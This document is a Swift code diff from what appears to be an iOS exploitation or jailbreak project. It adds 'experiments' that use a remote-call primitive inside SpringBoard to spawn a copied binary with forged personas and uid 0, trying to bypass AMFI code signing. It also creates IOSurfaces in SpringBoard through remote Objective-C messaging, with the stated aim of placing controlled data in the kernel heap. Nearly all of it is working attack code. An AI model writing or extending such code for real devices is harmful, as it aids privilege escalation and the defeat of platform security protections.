@@ -427,11 +427,28 @@ struct AMFIExperimentView: View {
             experimentResults.append(exp46)
             
             // ============================================
-            // 🔥 Experiment 47: IOSurface from SpringBoard
-            // SpringBoard HAS IOSurface entitlement!
+            // 🔥 Experiment 47: IOSurface from SpringBoard — DISABLED (panic)
             // ============================================
-            let exp47 = self.expIOSurfaceFromSB()
-            experimentResults.append(exp47)
+            experimentResults.append(ExperimentResult(
+                name: "🔥 IOSurface SB (DISABLED)",
+                success: false,
+                detail: "⚠️ Disabled — CFDictionary/IOSurface creation crashes SpringBoard.\nNeed proper CF callback pointers for dictionary creation.",
+                timestamp: Date()
+            ))
+            
+            // ============================================
+            // 🔥 Experiment 48: posix_spawnattr_set_persona_np
+            // Set process persona to "platform binary" before exec
+            // ============================================
+            let exp48 = self.expPersonaSpawn(rc: rc)
+            experimentResults.append(exp48)
+            
+            // ============================================
+            // 🔥 Experiment 49: IOSurface via ObjC (proper dict creation)
+            // Use NSMutableDictionary instead of CFDictionary
+            // ============================================
+            let exp49 = self.expIOSurfaceObjC()
+            experimentResults.append(exp49)
             
             DispatchQueue.main.async {
                 self.results = experimentResults
@@ -2732,6 +2749,175 @@ struct AMFIExperimentView: View {
         
         let success = detail.contains("✅ IOSurface CREATED")
         return ExperimentResult(name: "🔥 IOSurface KRW", success: success, detail: detail, timestamp: Date())
+    }
+    
+    /// Persona spawn: set process persona to platform binary before exec
+    /// posix_spawnattr_set_persona_np might bypass AMFI for specific persona
+    private func expPersonaSpawn(rc: RemoteCall) -> ExperimentResult {
+        let mem = rc.trojanMem
+        var detail = "Testing posix_spawnattr persona...\n\n"
+        
+        // Copy binary first
+        let srcPath = remote_alloc_str(rc, "/bin/df")
+        let dstPath = remote_alloc_str(rc, "/tmp/.dsp_persona_test")
+        RootExecutor.rcall(rc, "unlink", dstPath)
+        
+        let sf = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
+        let df = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+        if sf != UInt64(bitPattern: -1) && df != UInt64(bitPattern: -1) {
+            let buf = mem + 0x800
+            for _ in 0..<50 {
+                let n = RootExecutor.rcall(rc, "read", sf, buf, 2048)
+                if n == 0 || n > 2048 { break }
+                RootExecutor.rcall(rc, "write", df, buf, n)
+            }
+            RootExecutor.rcall(rc, "close", sf)
+            RootExecutor.rcall(rc, "close", df)
+        }
+        
+        // Try different persona IDs
+        // Persona 0 = default, 1 = platform, etc
+        let personas: [(String, UInt32, UInt32)] = [
+            ("persona 0 (default)", 0, 0),
+            ("persona 1 (platform?)", 1, 0),
+            ("persona 99 (root?)", 99, 0),
+            ("uid=0 persona", 0, 1),  // POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE = 1
+        ]
+        
+        for (name, personaID, flags) in personas {
+            let attrAddr = mem + 0x1800
+            rc[attrAddr].setValue64(0)
+            RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
+            
+            // posix_spawnattr_set_persona_np(attr, persona_id, flags)
+            let setPersona = RootExecutor.rcall(rc, "posix_spawnattr_set_persona_np", attrAddr, UInt64(personaID), UInt64(flags))
+            
+            // Also try set_persona_uid_np and set_persona_gid_np
+            RootExecutor.rcall(rc, "posix_spawnattr_set_persona_uid_np", attrAddr, 0) // uid=0
+            RootExecutor.rcall(rc, "posix_spawnattr_set_persona_gid_np", attrAddr, 0) // gid=0
+            
+            let argvBase = mem + 0x1C00
+            rc[argvBase].setValue64(dstPath)
+            rc[argvBase + 8].setValue64(0)
+            let pidAddr = mem + 0x1E00
+            rc[pidAddr].setValue64(0)
+            
+            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, attrAddr, argvBase, 0)
+            RootExecutor.rcall(rc, "usleep", 300000)
+            let wait = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
+            
+            detail += "\(name): set=\(setPersona), spawn ret=\(ret), wait=\(wait)\n"
+            
+            if ret == 0 {
+                detail += "  🎉 SPAWN SUCCESS WITH PERSONA!\n"
+            }
+            
+            RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
+        }
+        
+        RootExecutor.rcall(rc, "unlink", dstPath)
+        RootExecutor.rcall(rc, "free", srcPath)
+        RootExecutor.rcall(rc, "free", dstPath)
+        
+        let success = detail.contains("🎉")
+        return ExperimentResult(name: "persona spawn", success: success, detail: detail, timestamp: Date())
+    }
+    
+    /// IOSurface via ObjC — use NSDictionary (proper object, no crash)
+    /// Previous crash was from CFDictionaryCreateMutable with NULL callbacks
+    private func expIOSurfaceObjC() -> ExperimentResult {
+        guard let sb = dspmgr.shared.sbProc else {
+            return ExperimentResult(name: "IOSurface ObjC", success: false, detail: "No SpringBoard RC", timestamp: Date())
+        }
+        
+        var detail = "IOSurface via ObjC (NSDictionary)\n\n"
+        
+        // Use ObjC runtime to create NSDictionary properly
+        // [[NSDictionary alloc] initWithObjectsAndKeys:@(0x4000), @"IOSurfaceAllocSize", nil]
+        
+        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
+        let nsNumClass = remote_getClass(sb, "NSNumber")
+        
+        detail += "NSMutableDictionary class: 0x\(String(format: "%llx", nsDictClass))\n"
+        detail += "NSNumber class: 0x\(String(format: "%llx", nsNumClass))\n"
+        
+        guard nsDictClass != 0 && nsNumClass != 0 else {
+            detail += "❌ ObjC classes not found\n"
+            return ExperimentResult(name: "IOSurface ObjC", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Create NSNumber with value 0x4000
+        let numWithInt = remote_sel(sb, "numberWithInteger:")
+        let allocSize = remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0)
+        detail += "NSNumber(0x4000): 0x\(String(format: "%llx", allocSize))\n"
+        
+        // Create NSMutableDictionary
+        let dictNew = remote_sel(sb, "new")
+        let dict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
+        detail += "NSMutableDictionary: 0x\(String(format: "%llx", dict))\n"
+        
+        guard dict != 0 && allocSize != 0 else {
+            detail += "❌ Failed to create objects\n"
+            return ExperimentResult(name: "IOSurface ObjC", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Set key: @"IOSurfaceAllocSize" = @(0x4000)
+        let setObj = remote_sel(sb, "setObject:forKey:")
+        let keyStr = remote_NSString(sb, "IOSurfaceAllocSize")
+        remote_msg(sb, dict, setObj, allocSize, keyStr, 0, 0)
+        
+        // Also set width/height/bytesPerElement (might be required)
+        let widthNum = remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0)
+        let heightNum = remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0)
+        let bpeNum = remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0)
+        
+        let widthKey = remote_NSString(sb, "IOSurfaceWidth")
+        let heightKey = remote_NSString(sb, "IOSurfaceHeight")
+        let bpeKey = remote_NSString(sb, "IOSurfaceBytesPerElement")
+        
+        remote_msg(sb, dict, setObj, widthNum, widthKey, 0, 0)
+        remote_msg(sb, dict, setObj, heightNum, heightKey, 0, 0)
+        remote_msg(sb, dict, setObj, bpeNum, bpeKey, 0, 0)
+        
+        detail += "Dictionary populated with AllocSize/Width/Height/BPE\n\n"
+        
+        // Now call IOSurfaceCreate with proper NSDictionary (toll-free bridged to CFDictionary!)
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        let ioCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceCreate"))
+        
+        if ioCreate != 0 {
+            // NSDictionary is toll-free bridged to CFDictionaryRef!
+            let surface = RootExecutor.rcall(sb, "IOSurfaceCreate", dict)
+            detail += "IOSurfaceCreate(dict): 0x\(String(format: "%llx", surface))\n"
+            
+            if surface != 0 {
+                detail += "\n✅✅✅ IOSurface CREATED via ObjC! ✅✅✅\n"
+                detail += "Surface object: 0x\(String(format: "%llx", surface))\n"
+                
+                // Get ID
+                let getID = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceGetID"))
+                if getID != 0 {
+                    let sid = RootExecutor.rcall(sb, "IOSurfaceGetID", surface)
+                    detail += "Surface ID: \(sid)\n"
+                }
+                
+                detail += "\nIOSurface property R/W now available!\n"
+                detail += "Can allocate controlled data in kernel heap!\n"
+            } else {
+                detail += "❌ IOSurfaceCreate returned NULL\n"
+                detail += "SpringBoard might not have IOSurface entitlement\n"
+            }
+        } else {
+            detail += "❌ IOSurfaceCreate not found (framework not loaded?)\n"
+            // Try loading
+            let fwPath = remote_alloc_str(sb, "/System/Library/Frameworks/IOSurface.framework/IOSurface")
+            RootExecutor.rcall(sb, "dlopen", fwPath, 1)
+            RootExecutor.rcall(sb, "free", fwPath)
+            detail += "Tried loading framework — re-run to test\n"
+        }
+        
+        let success = detail.contains("✅✅✅")
+        return ExperimentResult(name: "IOSurface ObjC (SB)", success: success, detail: detail, timestamp: Date())
     }
     
     /// IOSurface from SpringBoard — SB has IOSurface entitlement!
